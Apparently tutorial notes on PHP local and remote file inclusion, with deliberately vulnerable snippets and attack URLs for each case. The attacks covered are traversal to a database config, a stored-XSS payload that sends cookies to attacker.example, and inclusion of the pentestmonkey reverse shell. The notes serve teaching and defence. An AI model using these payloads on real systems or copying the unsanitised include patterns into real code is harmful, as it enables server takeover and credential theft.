# File Inclusion

## Local File Inclusion (LFI)

- A local file inclusion (LFI) vulnerability occurs when a web application allows a user to submit input into files or upload files to the server.
- Successful exploitation could allow an attacker to read and (in some cases) execute files on the victim’s system.
- Some LFI vulnerabilities can be critical if a web application is running with high privileges or as root.
- Such vulnerabilities can allow attackers to gain access to sensitive information and can even enable them to execute arbitrary commands in the affected system.

![image.png](image.png)

### Local file inclusion vs. directory traversal

Local file inclusion vulnerabilities are often confused with directory traversal (path traversal), which is similar but not synonymous:

- LFI means that the attacker can include source code files or view files that are located *within the document root directory* and its subdirectories, but it does not mean that the attacker can reach outside of the document root.
- Directory traversal means that the attacker can access files located *outside the document root directory*, for example, log files or the *passwd* file, and the attack does not involve running any malicious code.

---

Below are examples of PHP code with local file inclusion vulnerabilities, as well as different LFI attack vectors on applications that include this code.

## LFI that leads to sensitive information disclosure

The developer of a PHP application wants the user to be able to read poems stored in text files on the web server. These poems are written to text files, uploaded by other users, and stored in a relative *poems* directory. Then, the poems are displayed in the web browser as part of the HTML page. The following is a code snippet from the *poems/display.php* file.

`<?PHP     $file = $_GET["file"];    $handle = fopen($file, 'r');    $poem = fread($handle, 1);    fclose($handle);    echo $poem;?>`

As you can see, the filename is taken directly from the HTTP request header. Therefore, you can access and display a poem called *poem.txt* using the following URL:

`http://victim.example/my_app/display.php?file=poem.txt`

### The attack vector

The attacker abuses this script by manipulating the GET request using the following payload:

`http://victim.example/my_app/display.php?file=../config/database.php`

The *display.php* script navigates up to the document root directory and then down to the */config/* subdirectory. There, it includes the database configuration file *database.php*, which contains the username and password used to connect to the database. The data is exposed as part of the HTML code and the attacker just needs to examine the source code of the page to learn how to access the database directly.

## LFI that leads to cross-site scripting

Attackers may also use the code above to escalate the attack to stored cross-site scripting (XSS).

### The attack vector

The attacker first uses the poem file upload functionality to upload the following “poem” as a text file called *poem42.txt*:

`<script>fetch("http://attacker.example?log="+encodeURIComponent(document.cookie));</script>`

Then, the attacker submits a request to include the poem:

`http://victim.example/my_app/display.php?file=poem42.txt`

Since the content of the poem is intended to be directly displayed as part of the HTML code, the page code now includes a stored cross-site scripting vulnerability. The attacker may deliver this link to any number of victims, and anyone who opens it will have their session cookies sent to the attacker-controlled *attacker.example* site.

## LFI that leads to remote code execution

The developer of the same PHP application also wants to be able to include modules dynamically. The following is a code snippet from the *index.php* file.

`<?PHP   $module = $_GET["module"];  include $module;?>`

Again, the filename is taken directly from the GET HTTP request. Therefore, you can include the module *welcome.php* as follows:

`http://victim.example/index.php?module=welcome.php`

### The attack vector

The attacker first uses the poem upload functionality to upload *poem42.txt*, which contains the PHP source code of the pentest monkey reverse shell.

Then, the attacker manipulates the GET request to *index.php* to include the poem instead of a module:

`http://victim.example/index.php?module=poems/poem42.txt`

As a result, the application runs the code of the reverse shell (remote code execution), granting the attacker remote access to the server command line.

---

## Remote File Inclusion (RFI)

Remote file inclusion vulnerabilities happen when a malicious actor can modify user input to include their own remote files. This vulnerability most often happens in applications and APIs written in older versions of PHP with the *include* expression. In the case of other common web application programming languages, including files in a similar way requires much more complex programming constructs.

**NOTE**: the ability to include remote files has been deprecated since PHP 7.4.0, released in November 2019.

---

## Example of a remote file inclusion attack

Below is an example of PHP code with a remote file inclusion vulnerability, as well as an attack vector on an application that includes this code.

The developer of a PHP application wants to include a source code file from another server but the included file is not static. The following is a code snippet from the *index.php* file.

`<?PHP   $module = $_GET["module"];  include $module;?>`

The server runs PHP 7.3.33. The *php.ini* file includes the following configuration parameter:

`allow_url_include = On`

This parameter (deprecated in PHP 7.4.0) means that the *include* expression can parse a URL and include a file from that URL.

The URL is taken directly from the GET HTTP request, so you can include the module *http://server2.example.com/welcome.php* as follows:

`http://example.com/index.php?module=http://server2.example.com/welcome.php`

### The attack vector

The attacker manipulates the GET request sent to *index.php* to include a URL with a [p](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)entest monkey reverse shell script configured to connect to an attacker-controlled server:

`http://example.com/index.php?module=http://attacker.example2.com/php-reverse-shell.php`

As a result, the application runs the code of the reverse shell (remote code execution), granting the attacker remote access to the server command line.

---

## **Remote file inclusion vs. local file inclusion**

If the attacker can include a malicious file only from the same server, that is a local file inclusion (LFI) vulnerability. LFI vulnerabilities are much more common for several reasons:

- LFI includes not just cases when the developer includes a source code file but all cases where the attacker can access a local file that they should not be able to access.
- LFI happens in most web programming languages, not just PHP, since other languages also allow developers to open and/or include local files.
- Developers often need to include local source code or read and display the content of local files, which could lead to LFI. They rarely need to include source codes from remote locations, which is necessary for RFI.

Local file inclusion also often goes together with directory traversal. RFI, on the other hand, by definition cannot lead to directory traversal because the file is included by URL, not by path/filename.

You can also think about RFI as an attack that is in a way similar to cross-site scripting. In both cases, a vulnerable application takes untrusted code from an external source and executes it. However, in the case of RFI, attackers are abusing the PHP `include` mechanism instead of a `<script>` tag.

---

## Useful Links

- [https://www.offsec.com/metasploit-unleashed/file-inclusion-vulnerabilities/](https://www.offsec.com/metasploit-unleashed/file-inclusion-vulnerabilities/)
- [https://hackviser.com/tactics/pentesting/web/lfi-rfi](https://hackviser.com/tactics/pentesting/web/lfi-rfi)